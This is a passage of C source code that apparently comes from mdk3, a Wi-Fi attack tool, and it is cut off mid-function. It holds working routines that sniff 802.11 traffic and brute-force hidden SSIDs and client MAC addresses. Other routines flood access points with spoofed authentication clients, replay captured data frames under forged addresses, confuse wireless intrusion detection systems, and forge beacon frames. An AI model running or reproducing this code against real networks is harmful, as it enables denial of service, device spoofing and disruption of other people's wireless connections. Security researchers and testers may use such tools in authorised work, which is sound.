    for (t=0; t<256; t++) {  //Lets see if we have a dirty bitch...
	if ((line[t] == ' ' && t<11) || (line[t] == '\0' && t<12) || (line[t] == '\n' && t<12)) {
	    printf("Malformed SSID file! Skipping line: %s\n", line);
	    goto skipl;
	}
	if (line[t] == ' ') break;  // Position of first space stored in t
    }

    mac = parse_mac(line);
    ssid = line+t+1;

    fakeap.ssid = ssid;
    fakeap.mac = mac;

    return fakeap;
}

void init_clist(struct clist *c, uchar *first_data, int first_status, int max_data_len)
{
  //You will get a memory leak if you init an already initialized list!

  c->data = malloc(max_data_len);

  memcpy(c->data, first_data, max_data_len);
  c->status = first_status;
  c->next = c;
}

void init_clistwidsap(struct clistwidsap *c, uchar *first_bssid, int first_channel, int max_bssid_len, uchar first_capa1, uchar first_capa2)
{
  //You will get a memory leak if you init an already initialized list!

  c->bssid = malloc(max_bssid_len);

  memcpy(c->bssid, first_bssid, max_bssid_len);
  c->channel = first_channel;
  c->next = c;
  c->capa[0] = first_capa1;
  c->capa[1] = first_capa2;
}

void init_clistwidsclient(struct clistwidsclient *c, uchar *first_mac, int first_status, int max_mac_len, uchar *first_data, int max_data_len, struct clistwidsap *first_bssid)
{
  //You will get a memory leak if you init an already initialized list!

  c->mac = malloc(max_mac_len);
  c->data = malloc(max_data_len);

  memcpy(c->mac, first_mac, max_mac_len);
  memcpy(c->data, first_data, max_data_len);
  c->status = first_status;
  c->data_len = max_data_len;
  c->retry = 0;
  c->next = c;
  c->bssid = first_bssid;
}

struct clist *search_status(struct clist *c, int desired_status)
{
  struct clist *first = c;

  do {
    if (c->status == desired_status) return c;
    c = c->next;
  } while (c != first);

  return NULL;
}

struct clistwidsclient *search_status_widsclient(struct clistwidsclient *c, int desired_status, int desired_channel)
{
  struct clistwidsclient *first = c;

  do {
    if ((c->status == desired_status) && (c->bssid->channel == desired_channel)) return c;
    c = c->next;
  } while (c != first);

  return NULL;
}

struct clist *search_data(struct clist *c, uchar *desired_data, int data_len)
{
  struct clist *first = c;

  do {
    if (! (memcmp(c->data, desired_data, data_len))) return c;
    c = c->next;
  } while (c != first);

  return NULL;
}

struct clistwidsap *search_bssid(struct clistwidsap *c, uchar *desired_bssid, int bssid_len)
{
  struct clistwidsap *first = c;

  do {
    if (! (memcmp(c->bssid, desired_bssid, bssid_len))) return c;
    c = c->next;
  } while (c != first);

  return NULL;
}

struct clistwidsclient *search_client(struct clistwidsclient *c, uchar *mac, int mac_len)
{
  struct clistwidsclient *first = c;

  do {
    if (!(memcmp(c->mac, mac, mac_len))) return c;
    c = c->next;
  } while (c != first);

  return NULL;
}

struct clist *add_to_clist(struct clist *c, uchar *data, int status, int max_data_len)
{

  struct clist *new_item = (struct clist *) malloc(sizeof(struct clist));
  new_item->data = malloc(max_data_len);

  new_item->next = c->next;
  c->next = new_item;
  memcpy(new_item->data, data, max_data_len);
  new_item->status = status;

  return new_item;
}

struct clistwidsap *add_to_clistwidsap(struct clistwidsap *c, uchar *bssid, int channel, int max_bssid_len, uchar capa1, uchar capa2)
{

  struct clistwidsap *new_item = (struct clistwidsap *) malloc(sizeof(struct clistwidsap));
  new_item->bssid = malloc(max_bssid_len);

  new_item->next = c->next;
  c->next = new_item;
  memcpy(new_item->bssid, bssid, max_bssid_len);
  new_item->channel = channel;
  new_item->capa[0] = capa1;
  new_item->capa[1] = capa2;

  return new_item;
}

struct clistwidsclient *add_to_clistwidsclient(struct clistwidsclient *c, uchar *mac, int status, int max_mac_len, uchar *data, int max_data_len, struct clistwidsap *bssid)
{

  struct clistwidsclient *new_item = (struct clistwidsclient *) malloc(sizeof(struct clistwidsclient));
  new_item->mac = malloc(max_mac_len);
  new_item->data = malloc(max_data_len);

  new_item->next = c->next;
  c->next = new_item;
  memcpy(new_item->mac, mac, max_mac_len);
  memcpy(new_item->data, data, max_data_len);
  new_item->status = status;
  new_item->data_len = max_data_len;
  new_item->retry = 0;
  new_item->bssid = bssid;

  return new_item;
}

int is_from_target_ap(uchar *targetap, uchar *packet)
{

	uchar *bss = NULL;
	uchar ds = packet[1] & 3;	//Set first 6 bits to 0

	switch (ds) {
	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	case 0:
		bss = packet + 16;
		break;
	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	case 1:
		bss = packet + 4;
		break;
	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	case 2:
		bss = packet + 10;
		break;
	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	case 3:
		bss = packet + 10;
		break;
	}

    if (!memcmp(targetap, bss, 6)) return 1;
    return 0;
}

//Returns pointer to the desired MAC Adresses inside a packet
//Type: s => Station
//      a => AP
//      b => BSSID
uchar *get_macs_from_packet(char type, uchar *packet)
{
    uchar *bssid, *station, *ap;

    //Ad-Hoc Case!
    bssid = packet + 16;
    station = packet + 10;
    ap = packet + 4;

    if ((packet[1] & '\x01') && (!(packet[1] & '\x02'))) {	// ToDS packet
	bssid = packet + 4;
	station = packet + 10;
	ap = packet + 16;
    }
    if ((!(packet[1] & '\x01')) && (packet[1] & '\x02')) {	// FromDS packet
	station = packet + 4;
	bssid = packet + 10;
	ap = packet + 16;
    }
    if ((packet[1] & '\x01') && (packet[1] & '\x02')) {		// WDS packet
	station = packet + 4;
	bssid = packet + 10;
	ap = packet + 4;
    }

    switch(type) {

    case 's':
	return station;

    case 'a':
	return ap;

    case 'b':
	return bssid;
    }

    return NULL;
}

void channel_hopper()
{
    // A simple thread to hop channels
    int cclp = 0;

    while (1) {

	set_channel(chans[cclp]);
	cclp++;
	if (chans[cclp] == 0) cclp = 0;
	sleep(hopper_seconds);

    }
}

void init_channel_hopper(char *chanlist, int seconds)
{
    // Channel list chans[MAX_CHAN_COUNT] has been initialized with declaration for all b/g channels
    char *token = NULL;
    int chan_cur = EOF;
    int lpos = 0;

    if (chanlist == NULL) {    // No channel list given - using defaults
	printf("\nUsing default channels for hopping.\n");
    } else {

	while( (token = strsep(&chanlist, ",")) != NULL) {
	    if( sscanf(token, "%d", &chan_cur) != EOF) {
		chans[lpos] = chan_cur;
		lpos++;
		if (lpos == MAX_CHAN_COUNT) {
		    fprintf(stderr, "Exceeded max channel list entries\n");
		    exit(1);
		}
	    }
	}

	chans[lpos] = 0;
    }

    hopper_seconds = seconds;

    pthread_t hopper;
    pthread_create( &hopper, NULL, (void *) channel_hopper, (void *) 1);

}

struct beaconinfo parse_beacon(uchar *frame, int framelen)
{
    struct beaconinfo bi;
    bi.ssid = NULL;
    bi.ssid_len = 0;
    bi.channel = 0;
    int pos = 36;

    while (pos < framelen) {
	switch (frame[pos]) {
	case 0x00: //SSID
	    bi.ssid_len = (int) frame[pos+1];
	    bi.ssid = frame+pos+2;
	break;
	case 0x03: //Channel
	    bi.channel = (int) frame[pos+2];
	break;
	}
	pos += (int) frame[pos+1] + 2;
    }

    bi.capa[0] = frame[34];
    bi.capa[1] = frame[35];
    bi.bssid = frame+10;

    return bi;
}

void tvdiff(struct timeval *tv2, struct timeval *tv1, struct timeval *diff)
{
  if ((diff == NULL) || (tv2 == NULL && tv1 == NULL))
    return;
  else if (tv2 == NULL) {
    diff->tv_sec  = -1 * tv1->tv_sec;
    diff->tv_usec = -1 * tv1->tv_usec;
  } else if (tv1 == NULL) {
    diff->tv_sec  = tv2->tv_sec;
    diff->tv_usec = tv2->tv_usec;
  } else if (tv2->tv_sec == tv1->tv_sec) {
    /* No wrapping */
    diff->tv_sec = 0;
    diff->tv_usec = tv2->tv_usec - tv1->tv_usec;
  } else {
    /* Wrapped >= one or more times. Since the final usec value is less than
     * the original we only increased time by tv1->tv_sec - tv2->tv_sec - 1
     * seconds.
     * */
    diff->tv_sec  = (tv2->tv_sec - tv1->tv_sec) - 1;
    diff->tv_usec = 1000000l - tv1->tv_usec + tv2->tv_usec;
    if (diff->tv_usec >= 1000000l) {
      diff->tv_sec++;
      diff->tv_usec -= 1000000l;
    }
  }
  if (diff->tv_sec < 0) {
    diff->tv_sec--;
    diff->tv_usec -= 1000000l;
  }
}

void increase_mac_adress(uchar *macaddr)
{
    macaddr[2]++;
    if (macaddr[2] == 0) {
	macaddr[1]++;
	if (macaddr[1] == 0) {
	    macaddr[0]++;
	}
    }
}

uchar *get_next_mac()
{
    static int pos = -1;
    static uchar lowb[3] = "\xFF\xFF\xFF";
    static uchar upb[3] = "\xFF\xFF\xFF";

    if (mac_base == NULL) {		//Use internal database
	//Increase lower bytes
	increase_mac_adress(lowb);
	//Get new upper bytes?
	if ((lowb[0] == 0) && (lowb[1] == 0) && (lowb[2] == 0)) {
	    //New pos in client list
	    pos++;
	    if (pos == clients_count) {
		printf("\rOut of MAC adresses....\n");
		exit(1);
	    }
	    //Filling the first three bytes
	    upb[0] = hex2char(clients[pos][0], clients[pos][1]);
	    upb[1] = hex2char(clients[pos][2], clients[pos][3]);
	    upb[2] = hex2char(clients[pos][4], clients[pos][5]);
	}
	memcpy(mac_v, upb, 3);
	memcpy(mac_v+3, lowb, 3);
    } else {				//Use MAC given by user
	increase_mac_adress(lowb);

	if (mac_lower != NULL) {	//Use start MAC given by user
	    memcpy(lowb, mac_lower, 3);
	    mac_lower = NULL;
	}

	if ((lowb[0] == 255) && (lowb[1] == 255) && (lowb[2] == 255)) {
	    printf("\rOut of MAC adresses....\n");
	    exit_now = 1;
	}
	memcpy(mac_v, mac_base, 3);
	memcpy(mac_v+3, lowb, 3);
    }

    return mac_v;
}

/* Sniffing Functions */

uchar *get_target_ap()
{
// Sniffing for beacon frames to find target APs
// Tries to to find NEW AP when called, saves already reported APs in aps_known[] array
// If it cannot find a new AP within 100 frames it either choses a random known AP
// or if no APs were ever found it keeps sniffing.

    int len = 0;
    int t, u, known;
    uchar rnd;

    keep_waiting: // When nothing ever found this is called after the sniffing loop

    for (t=0; t<100; t++)
    {
	len = 0;
	while (len < 22)
	    len = read_packet(pkt_sniff, 4096);
	known = 0;   // Clear known flag
	if (! memcmp(pkt_sniff, "\x80", 1)) {   //Filter: let only Beacon frames through
	    for (u=0; u<aps_known_count; u++)
	    {
		if (! memcmp(aps_known[u], pkt_sniff+16, 6)) { 
		    known = 1; 
		    break;
		}   // AP known => Set known flag
	    }
	    if (! known)  // AP is NEW, copy MAC to array and return it
	    {
		memcpy(aps_known[aps_known_count], pkt_sniff+16, ETH_MAC_LEN);
		aps_known_count++;

		if ((unsigned int) aps_known_count >=
			sizeof (aps_known) / sizeof (aps_known[0]) ) {
			fprintf(stderr, "exceeded max aps_known\n");
			exit (1);
		}

		return pkt_sniff+16;
	    }
	}
    }

    // No new target found within 100 packets
    // If there are no beacons at all, wait for some to appear
    if (aps_known_count == 0)
	goto keep_waiting;

    // Pick random known AP to try once more
    rnd = random() % aps_known_count;

    return (uchar *) aps_known[rnd];
}

uchar *get_target_deauth()
{
// Sniffing for data frames to find targets

    int len = 0;

    pktsux:
    len = 0;
    while (len < 22) len = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
    if (! memcmp(pkt_sniff, "\x08", 1))
	return pkt_sniff;
    if (! memcmp(pkt_sniff, "\x88", 1))
	return pkt_sniff;
    goto pktsux;

}

struct pckt get_target_ssid()
{
    struct pckt ssid;
    uchar *zero_ssid;
    int len=0;

//Sniff packet
    printf("Waiting for beacon frame from target...\n");

    while (1) {
	len = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	if (len < 22) continue;
	if (! memcmp(pkt_sniff, "\x80", 1)) {
	    if (! memcmp(target, pkt_sniff+16, ETH_MAC_LEN)) break;
	}
    }

//Find SSID tag in frame
    if (pkt_sniff[36] != '\x00') {
	printf("\nUNPARSABLE BEACON FRAME!\n");
	exit_now = 1;
    }
    if (pkt_sniff[37] > 32) printf("\nWARNING: NON-STANDARD BEACON FRAME, SSID LENGTH > 32\n");

//Analyze tag, Check if matching 0x00
    if (pkt_sniff[37] == '\x00') {
	printf("\nFound SSID length 0, no information about real SSIDs length available.\n");
    } else if (pkt_sniff[37] == '\x01') {
	printf("\nFound SSID length 1, usually a placeholder, no information about real SSIDs length available.\n");
    } else {
	zero_ssid = (uchar *) malloc(pkt_sniff[37]);
	memset(zero_ssid, '\x00', pkt_sniff[37]);
	if (! memcmp(pkt_sniff+38, zero_ssid, pkt_sniff[37])) {
	    printf("\nSSID is hidden. SSID Length is: %d.\n", pkt_sniff[37]);
	} else {
	    pkt_sniff[38+pkt_sniff[37]] = '\x00';
	    printf("\nSSID does not seem to be hidden! Found: \"%s\"\n", pkt_sniff+38);
	    exit_now = 1;
	}
    }

//return SSID string in packet struct
    pkt_sniff[38+pkt_sniff[37]] = '\x00';
    ssid.len = pkt_sniff[37];
    ssid.data = pkt_sniff+38;

    return ssid;
}

void ssid_brute_sniffer()
{
    printf("Sniffer thread started\n");
    int len=0;
    int i;
    int no_disp;
//infinite loop
    while (1) {
//sniff packet
	len = read_packet(pkt_check, MAX_PACKET_LENGTH);
//is probe response?
	if (! memcmp(pkt_check, "\x50", 1)) {
//parse + print response
	    uchar *mac = pkt_check+16;
	    uchar slen = pkt_check[37];
	    pkt_check[38+slen] = '\x00';
	    no_disp = 0;
	    for (i=0; i<aps_known_count; i++) {
		if (!memcmp(aps_known[i], mac, ETH_MAC_LEN)) no_disp = 1;
	    }
	    if (!exit_now && !no_disp) {
		printf("\nGot response from %02X:%02X:%02X:%02X:%02X:%02X, SSID: \"%s\"\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_check+38);
		printf("Last try was: %s\n", brute_ssid);
	    }
	    if (!no_disp) {
		memcpy(aps_known[aps_known_count], mac, ETH_MAC_LEN);
		aps_known_count++;
		if ((unsigned int) aps_known_count >=
			sizeof (aps_known) / sizeof (aps_known[0]) ) {
			fprintf(stderr, "exceeded max aps_known\n");
			exit (1);
		}
	    }
//If response is from target, exit mdk3
	    if (target != NULL) { 
		if (!memcmp(pkt_check+16, target, ETH_MAC_LEN)) {
		    exit_now = 1;
		}
	    }
	}
//loop
    }
}

void intelligent_auth_sniffer()
{
    // Cannot use pkt_sniff here, its used in packet generator thread already!
    uchar pkt_auth[MAX_PACKET_LENGTH];
    //static int sniffer_initialized = 0;
    int plen;
    struct clist *search;
    unsigned long data_size = 0;
    unsigned long max_data_size = 33554432L;	// mdk will store up to 32 MB of captured traffic
    int size_warning = 0;
    uchar *src = NULL;
    uchar *dst = NULL;
    uchar ds;

    // Note: Client list is setup by packet generator prior to sniffer start, so there are no race conditions

    // Client status descriptions:
    // 0 : not authed, not associated (kicked / new)
    // 1 : authed but not yet associated
    // 2 : connected (can inject data now)

    while (1) {
	plen = read_packet(pkt_auth, MAX_PACKET_LENGTH);

	if (!is_from_target_ap(target, pkt_auth)) continue;	// skip packets from other sources

	switch (pkt_auth[0]) {

	case 0xB0:  //0xB0
	    // Authentication Response
	    // We don't care about the status code, just making the AP busy in case of failure!
	    search = search_data(current, pkt_auth + 4, ETH_MAC_LEN);
	    if (search == NULL) break;
	    if (search->status < 1) {	//prevent problems since many APs send multiple responses
		search->status = 1;
		ia_stats.c_authed++;
	    }
	    break;

	case 0x10:  //0x10
	    // Association Response
	    // Again, we don't care if its successful, we just send data to
	    // let the AP do some work when deauthing the fake client again
	    search = search_data(current, pkt_auth + 4, ETH_MAC_LEN);
	    if (search == NULL) break;
	    if (search->status < 2) {	//prevent problems since many APs send multiple responses
		search->status = 2;
		ia_stats.c_assoced++;
	    }
	    break;

	case 0xC0:  //0xC0
	    // Deauthentication
	case 0xA0:  //0xA0
	    // Disassociation
	    search = search_data(current, pkt_auth + 4, ETH_MAC_LEN);
	    if (search == NULL) break;
	    if (search->status != 0) {	//Count only one deauth if the AP does flooding
		search->status = 0;
		ia_stats.c_kicked++;
	    }
	    break;

	case 0x08:  //0x08
	    // Data packet
	    // Take care about ToDS and FromDS since they change MAC position in packet!
	    ds = pkt_auth[1] & 3;		//Set first 6 bits to 0
	    switch (ds) {
		// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
		case 0:
		    src = pkt_auth + 10;
		    dst = pkt_auth + 4;
		    break;
		// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
		case 1:
		    src = pkt_auth + 10;
		    dst = pkt_auth + 16;
		    break;
		// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
		case 2:
		    src = pkt_auth + 16;
		    dst = pkt_auth + 4;
		    break;
		// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
		case 3:
		    src = pkt_auth + 26;
		    dst = pkt_auth + 16;
		    break;
	    }

	    // Check if packet got relayed (source adress == fake mac)
	    search = search_data(current, src, ETH_MAC_LEN);
	    if (search != NULL) {
		ia_stats.d_relays++;
		break;
	    }

	    // Check if packet is an answer to an injected packet (destination adress == fake mac)
	    search = search_data(current, dst, ETH_MAC_LEN);
	    if (search != NULL) {
		ia_stats.d_responses++;
		break;
	    }

	    // If it's none of these, check if the maximum lenght is exceeded
	    if (data_size < max_data_size) {
		// Ignore WDS packets
		if ((pkt_auth[1] & 3) != 3) {
		    if (!we_got_data) {
			// Set we_got_data when we receive the first data packet, and initialize data list
			we_got_data = 1;
			init_clist(&a_data, pkt_auth, plen, plen);
		    } else {
			// Or add it to the a_data list
			a_data_current = add_to_clist(&a_data, pkt_auth, plen, plen);
			a_data_current = a_data_current->next;
		    }
		    // increase ia_stats captured counter & data_size
		    ia_stats.d_captured++;
		    data_size += plen;
		}
	    } else {
		if (!size_warning) {
		    printf("--------------------------------------------------------------\n");
		    printf("WARNING: mdk3 has now captured more than %ld MB of data packets\n", max_data_size / 1024 / 1024);
		    printf("         New data frames will be ignored to save memory!\n");
		    printf("--------------------------------------------------------------\n");
		    size_warning = 1;
		}
	    }

	default:
	    // Not interesting, count something??? Nah...
	    break;
	}
    }
}

struct pckt get_data_for_intelligent_auth_dos(uchar *mac)
{

    struct pckt retn;
    retn.data = NULL;
    retn.len = 0;

    uchar ds;
    uchar *dst = NULL;
    uchar dest[ETH_MAC_LEN];

    //Skip some packets for more variety
    a_data_current = a_data_current->next;
    a_data_current = a_data_current->next;

    //Copy packet out of the list
    memcpy(tmpbuf, a_data_current->data, a_data_current->status);

    //find DST to copy it
	ds = tmpbuf[1] & 3;		//Set first 6 bits to 0
	switch (ds) {
	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	case 0:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	case 1:
		dst = tmpbuf + 16;
		break;
	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	case 2:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	case 3:
		dst = tmpbuf + 16;
		break;
	}
    memcpy(dest, dst, ETH_MAC_LEN);

    //Set Target, DST, SRC and ToDS correctly
    memcpy(tmpbuf+4 , target, ETH_MAC_LEN);	//BSSID
    memcpy(tmpbuf+10, mac,    ETH_MAC_LEN);	//Source
    memcpy(tmpbuf+16, dest,   ETH_MAC_LEN);	//Destination

    tmpbuf[1] &= 0xFC;	// Clear DS field
    tmpbuf[1] |= 0x01;	// Set ToDS bit

    //Return it to have fun with it
    retn.data = tmpbuf;
    retn.len = a_data_current->status;

    return retn;

}

void wids_sniffer()
{
    int plen;
    struct beaconinfo bi;
    struct clistwidsap *belongsto;
    struct clistwidsclient *search;

    while (1) {
	plen = read_packet(pkt_sniff, MAX_PACKET_LENGTH);

	switch (pkt_sniff[0]) {
	case 0x80: //Beacon frame
	    bi = parse_beacon(pkt_sniff, plen);
	    //if (bi.ssid_len != essid_len) break; //Avoid segfaults
	    if (zc_exploit) { //Zero_Chaos connects to foreign APs
		if (! memcmp(essid, bi.ssid, essid_len)) { //this is an AP inside the WDS, we just add him to the list
		    if (!init_zc_own) {
			init_clistwidsap(&zc_own, bi.bssid, bi.channel, ETH_MAC_LEN, bi.capa[0], bi.capa[1]);
			init_zc_own = 1;
		    } else {
			if (search_bssid(zc_own_cur, bi.bssid, ETH_MAC_LEN) != NULL) break; //AP is known
			add_to_clistwidsap(zc_own_cur, bi.bssid, bi.channel, ETH_MAC_LEN, bi.capa[0], bi.capa[1]);
			printf("\rFound WDS AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
		    }
		break;
		}
	    } else { //But ASPj's attack does it this way!
		if (memcmp(essid, bi.ssid, essid_len)) break; //SSID doesn't match
	    }

	    if (!init_aplist) {
		init_clistwidsap(&clwa, bi.bssid, bi.channel, ETH_MAC_LEN, bi.capa[0], bi.capa[1]);
		init_aplist = 1;
	    } else {
		if (search_bssid(clwa_cur, bi.bssid, ETH_MAC_LEN) != NULL) break; //AP is known
		add_to_clistwidsap(clwa_cur, bi.bssid, bi.channel, ETH_MAC_LEN, bi.capa[0], bi.capa[1]);
	    }
	    wids_stats.aps++;
	    if (zc_exploit) {
		printf("\rFound foreign AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
	    } else {
		printf("\rFound AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
	    }
	break;

	case 0x08: //Data frame
	    if (!init_aplist) break; // If we have found no AP yet, we cannot find any clients belonging to it
	    uchar ds = pkt_sniff[1] & 3;	//Set first 6 bits to 0
	    uchar *bss = NULL;
	    uchar *client = NULL;
	    switch (ds) {
	    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	    case 0:
		bss = pkt_sniff + 16;
		client = NULL;	//Ad-hoc network packet - Useless for WIDS
		break;
	    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	    case 1:
		bss = pkt_sniff + 4;
		client = pkt_sniff + 10;
		break;
	    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	    case 2:
		bss = pkt_sniff + 10;
		client = pkt_sniff + 4;
		break;
	    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	    case 3:
		bss = pkt_sniff + 10;
		client = NULL;  //Intra-Distribution-System WDS packet - useless, no client involved
		break;
	    }
	    if (client == NULL) break;  // Drop useless packets
	    belongsto = search_bssid(clwa_cur, bss, ETH_MAC_LEN);
	    if (zc_exploit) {
		if (belongsto != NULL) break; //Zero: this client does NOT belong to target WDS, drop it
		belongsto = search_bssid(zc_own_cur, bss, ETH_MAC_LEN);
		if (belongsto == NULL) break; //Zero: Don't know that AP, drop
	    } else {
		if (belongsto == NULL) break; //ASPj: client is NOT in our WDS -> drop
	    }

	    if (!init_clientlist) {
		init_clistwidsclient(&clwc, client, 0, ETH_MAC_LEN, pkt_sniff, plen, belongsto);
		init_clientlist = 1;
	    } else {
		if (search_client(clwc_cur, client, ETH_MAC_LEN) != NULL) break; //Client is known
		add_to_clistwidsclient(clwc_cur, client, 0, ETH_MAC_LEN, pkt_sniff, plen, belongsto);
	    }


	    wids_stats.clients++;
    	    printf("\rFound Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", client[0], client[1], client[2], client[3], client[4], client[5], belongsto->bssid[0], belongsto->bssid[1], belongsto->bssid[2], belongsto->bssid[3], belongsto->bssid[4], belongsto->bssid[5]);
	break;

	case 0xB0:  // Authentication Response
	    search = search_client(clwc_cur, pkt_sniff + 4, ETH_MAC_LEN);
	    if (search == NULL) break;
	    if (search->status < 1) {	//prevent problems since many APs send multiple responses
		search->status = 1;
		search->retry = 0;
	    }
	break;

	case 0x10:  // Association Response
	    search = search_client(clwc_cur, pkt_sniff + 4, ETH_MAC_LEN);
	    if (search == NULL) break;
	    if (search->status < 2) {	//prevent problems since many APs send multiple responses
		search->status = 2;
		search->retry = 0;
		printf("\rConnected Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", pkt_sniff[4], pkt_sniff[5], pkt_sniff[6], pkt_sniff[7], pkt_sniff[8], pkt_sniff[9], pkt_sniff[16], pkt_sniff[17], pkt_sniff[18], pkt_sniff[19], pkt_sniff[20], pkt_sniff[21]);
	    }
	break;

	case 0xC0:  // Deauthentication
	case 0xA0:  // Disassociation
	    search = search_client(clwc_cur, pkt_sniff + 4, ETH_MAC_LEN);
	    if (search == NULL) break;
	    wids_stats.deauths++;
	break;

        }
    }
}

struct pckt get_data_for_wids(struct clistwidsclient *cli)
{

    struct pckt retn;
    retn.data = NULL;
    retn.len = 0;

    uchar ds;
    uchar *dst = NULL;
    uchar dest[ETH_MAC_LEN];

    //Copy packet out of the list
    memcpy(tmpbuf, cli->data, cli->data_len);

    //find DST to copy it
	ds = tmpbuf[1] & 3;		//Set first 6 bits to 0
	switch (ds) {
	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	case 0:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	case 1:
		dst = tmpbuf + 16;
		break;
	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	case 2:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	case 3:
		dst = tmpbuf + 16;
		break;
	}
    memcpy(dest, dst, ETH_MAC_LEN);

    //Set Target, DST, SRC and ToDS correctly
    memcpy(tmpbuf+4 , cli->bssid->bssid, ETH_MAC_LEN);	//BSSID
    memcpy(tmpbuf+10, cli->mac, ETH_MAC_LEN);	//Source
    memcpy(tmpbuf+16, dest, ETH_MAC_LEN);	//Destination

    tmpbuf[1] &= 0xFC;	// Clear DS field
    tmpbuf[1] |= 0x01;	// Set ToDS bit

    //Return it to have fun with it
    retn.data = tmpbuf;
    retn.len = cli->data_len;

    return retn;

}

void mac_bruteforce_sniffer()
{
    int plen = 0;
    int interesting_packet;
    static uchar last_mac[6] = "\x00\x00\x00\x00\x00\x00";
//    static uchar ack[10] = "\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x00";

   while(1) {
      do {
	interesting_packet = 1;
	//Read packet
	plen = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	//is this an auth response packet?
	if (pkt_sniff[0] != 0xb0) interesting_packet = 0;
	//is it from our target
	if (! is_from_target_ap(target, pkt_sniff)) interesting_packet = 0;
	//is it a retry?
	if (! memcmp(last_mac, pkt_sniff+4, 6)) interesting_packet = 0;
      } while (! interesting_packet);
      //Buffering MAC to drop retry frames later
      memcpy(last_mac, pkt_sniff+4, 6);

      //SPEEDUP: (Doesn't work??) Send ACK frame to prevent AP from blocking the channel with retries
/*      memcpy(ack+4, target, 6);
      send_packet(ack, 10);
*/

      //Set has_packet
      has_packet_really = 1;
      //Send condition
      pthread_cond_signal(&has_packet);
      //Wait for packet to be cleared
      pthread_cond_wait (&clear_packet, &clear_packet_mutex);
    }

}

/* Packet Generators */

struct pckt create_beacon_frame(char *ssid, int chan, int wep, int random_mac, int gmode, int adhoc, int advanced)
{
// Generate a beacon frame

    struct pckt retn;
    char *hdr =	"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x64\x00\x05\x00\x00";

    char param1[12];
    int modelen;
    struct advap fakeap;

    // GCC Warning avoidance
    fakeap.ssid = NULL;
    fakeap.mac = NULL;

    if (advanced) fakeap = get_fakeap_from_file();

    if(gmode) {
	//1-54 Mbit
	memcpy(&param1, "\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c\x03\x01", 12);
	modelen = 12;
    }
    else {
	//1-11 Mbit
	memcpy(&param1, "\x01\x04\x82\x84\x8b\x96\x03\x01", 8);
	modelen = 8;
    }

    char *param2 = "\x04\x06\x01\x02\x00\x00\x00\x00\x05\x04\x00\x01\x00\x00";
    //WPA-TKIP Tag
    char *wpatkip = "\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x00\x00";
    //WPA-AES Tag
    char *wpaaes = "\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x02\x00\x00";

    int slen;
    struct pckt mac;

    //Getting SSID from file if file mode is in use
    if (advanced) {
	ssid = fakeap.ssid;
    } else {
	if (!(ssid_file_name == NULL)) ssid = read_line_from_file();
    }
    //Need to generate SSID or is one given?
    if (ssid == NULL) ssid = generate_ssid();
    slen = strlen(ssid);
    //Checking SSID lenght
    if (slen>32 && showssidwarn1) {
	printf("\rWARNING! Sending non-standard SSID > 32 bytes\n");
	showssidwarn1 = 0;
    }
    if (slen>255) {
	if (showssidwarn2) {
	    printf("\rWARNING! Truncating overlenght SSID to 255 bytes!\n");
	    showssidwarn2 = 0;
	}
	slen = 255;
    }
    // Setting up header
    memcpy(pkt, hdr, 36);
    // Set mode and WEP bit if wanted
    if(adhoc) {
        if(wep) pkt[34]='\x12';
        else pkt[34]='\x02';
